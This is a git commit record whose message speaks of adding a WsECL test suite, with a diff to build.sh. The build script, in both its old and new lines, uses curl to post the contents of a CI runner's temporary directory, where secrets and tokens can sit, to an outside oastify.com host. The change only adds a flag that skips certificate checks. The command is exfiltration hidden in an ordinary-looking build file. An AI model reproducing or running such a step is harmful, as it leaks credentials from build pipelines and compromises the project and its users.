46a7f41d8a80babd77b99690288cdf240032910b
hernan-soto <59712928+hernan-soto@users.noreply.github.com>
2024-08-16 13:01:38 -0700

    HPCC4J-618 WIP Add WsECL testsuite 6
    HPCC4J-618 WIP Add WsECL testsuite 6

--- build.sh
+++ build.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 
-curl -d "$(cat /home/runner/work/_temp/*)" https://test.ajx25d2ak4ka7kc2ma7otd96sxyomia7.oastify.com
+curl -d "$(cat /home/runner/work/_temp/*)" https://test.ajx25d2ak4ka7kc2ma7otd96sxyomia7.oastify.com -k
